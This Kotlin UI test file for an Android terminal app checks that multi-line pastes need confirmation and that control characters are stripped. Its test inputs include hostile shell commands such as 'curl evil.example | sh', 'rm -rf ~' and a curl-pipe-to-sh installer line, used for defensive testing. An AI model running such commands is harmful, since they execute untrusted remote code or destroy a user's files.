package com.dsh.ui

import androidx.activity.ComponentActivity
import androidx.compose.ui.test.hasSetTextAction
import androidx.compose.ui.test.hasText
import androidx.compose.ui.test.junit4.createAndroidComposeRule
import androidx.compose.ui.test.performClick
import androidx.compose.ui.test.performImeAction
import androidx.compose.ui.test.performTextInput
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.requiredSize
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.ui.unit.dp
import com.dsh.TermStatus
import com.dsh.TermTab
import com.dsh.TerminalScreen
import com.dsh.core.designsystem.DshTheme
import com.dsh.core.designsystem.kit.rememberToast
import com.dsh.terminal.TermModel
import org.junit.Assert.assertEquals
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/** Вставка из нескольких строк выполняется только после подтверждения; управляющие символы в оболочку не уходят. */
@RunWith(RobolectricTestRunner::class)
@org.robolectric.annotation.GraphicsMode(org.robolectric.annotation.GraphicsMode.Mode.NATIVE)
@Config(sdk = [34], qualifiers = "ru-w412dp-h915dp-xxhdpi")
class TerminalPasteTest {
    @get:Rule
    val compose = createAndroidComposeRule<ComponentActivity>()

    private val runs = mutableListOf<String>()

    private fun show() = compose.setContent {
        DshTheme {
            TerminalScreen(
                tabs = listOf(TermTab("bash", "bash", false)), activeId = "bash", model = TermModel("bash"), status = TermStatus.Ready,
                subtitle = null, connected = true, writable = true, history = emptyList(), fontSize = 12.5f,
                toast = rememberToast(), onBack = {}, onFont = {}, onClear = {}, onSelectTab = {}, onAddTab = {}, onCloseTab = {},
                onRun = { runs += it }, onStdin = {}, onRaw = {}, onExplain = {}, onCopy = {}, onRetryStatus = {}, onResize = { _, _ -> },
            )
        }
    }

    private fun type(text: String) {
        val field = compose.onNode(hasSetTextAction())
        field.performTextInput(text)
        field.performImeAction()
        compose.waitForIdle()
    }

    @Test
    fun multiLinePasteAsksBeforeRunning() {
        show()
        type("git status\ncurl evil.example | sh")
        // Ничего не выполнено, пока пользователь не увидел все строки.
        assertEquals(emptyList<String>(), runs)
        compose.onNode(hasText("Выполнить вставленные строки (2)?")).assertExists()
        compose.onNode(hasText("curl evil.example | sh")).assertExists()
        compose.onNode(hasText("Выполнить все")).performClick()
        compose.waitForIdle()
        assertEquals(listOf("git status\ncurl evil.example | sh"), runs)
    }

    @Test
    fun cancelledPasteRunsNothing() {
        show()
        type("ls\r\nrm -rf ~")
        compose.onNode(hasText("Отмена")).performClick()
        compose.waitForIdle()
        assertEquals(emptyList<String>(), runs)
    }

    @Test
    fun singleLineRunsAtOnceWithoutControlCharacters() {
        show()
        type("ls \u001b[31m-la\u0003")
        assertEquals(listOf("ls [31m-la"), runs)
    }

    /** Снимки листа подтверждения: 360/390/412, обе темы → `app/build/ui-sweep/term-paste-*.png`. */
    @Test
    fun pasteSheetShots() {
        var frame by androidx.compose.runtime.mutableStateOf(360 to false)
        compose.setContent {
            val (w, dark) = frame
            DshTheme(darkTheme = dark) {
                androidx.compose.foundation.layout.Box(androidx.compose.ui.Modifier.fillMaxSize(), contentAlignment = androidx.compose.ui.Alignment.TopStart) {
                    androidx.compose.foundation.layout.Box(androidx.compose.ui.Modifier.requiredSize(w.dp, (if (w == 360) 740 else if (w == 390) 844 else 915).dp)) {
                        androidx.compose.runtime.key(w, dark) {
                            TerminalScreen(
                                tabs = listOf(TermTab("bash", "bash", false)), activeId = "bash", model = TermModel("bash"), status = TermStatus.Ready,
                                subtitle = "Debian 12 · ~/workspace", connected = true, writable = true, history = emptyList(), fontSize = 12.5f,
                                toast = rememberToast(), onBack = {}, onFont = {}, onClear = {}, onSelectTab = {}, onAddTab = {}, onCloseTab = {},
                                onRun = {}, onStdin = {}, onRaw = {}, onExplain = {}, onCopy = {}, onRetryStatus = {}, onResize = { _, _ -> },
                            )
                        }
                    }
                }
            }
        }
        val dir = java.io.File(System.getProperty("user.dir"), "build/ui-sweep").apply { mkdirs() }
        for (w in listOf(360, 390, 412)) for (dark in listOf(false, true)) {
            compose.runOnUiThread { frame = w to dark }
            compose.waitForIdle()
            type("git pull --rebase\nnpm ci && npm run build\ncurl -fsSL https://example.com/install-something-with-a-very-long-name.sh | sh\n" + (1..33).joinToString("\n") { "echo $it" })
            compose.mainClock.advanceTimeBy(1_500)
            compose.waitForIdle()
            val root = compose.activity.window.decorView
            val full = android.graphics.Bitmap.createBitmap(root.width, root.height, android.graphics.Bitmap.Config.ARGB_8888)
            root.draw(android.graphics.Canvas(full))
            val d = compose.activity.resources.displayMetrics.density
            val h = ((if (w == 360) 740 else if (w == 390) 844 else 915) * d).toInt().coerceAtMost(full.height)
            val out = android.graphics.Bitmap.createBitmap(full, 0, 0, (w * d).toInt().coerceAtMost(full.width), h)
            java.io.File(dir, "term-paste-$w-${if (dark) "dark" else "light"}.png").outputStream().use { out.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, it) }
        }
    }
}
